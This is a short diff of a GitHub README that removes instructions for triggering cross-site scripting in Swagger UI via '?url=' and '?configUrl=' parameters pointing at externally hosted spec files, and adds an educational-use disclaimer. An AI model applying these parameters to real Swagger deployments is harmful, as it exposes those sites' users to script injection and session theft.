@@ -1,9 +1,1 @@
-## swagger  
-
-Files needed to exploit XSS in Swagger :) Just need to add these below parameters/values:
-
-?url=https://raw.githubusercontent.com/B1gN0Se/swagger/main/swagger.yaml 
-
-or
-
-?configUrl=https://raw.githubusercontent.com/B1gN0Se/swagger/main/swagger.json
+⚠️ **Disclaimer**: The content in this repository is for educational and informational purposes only; the authors hold no responsibility for misuse. Ensure proper authorization before use, act responsibly at your own risk, and comply with all legal and ethical guidelines. 
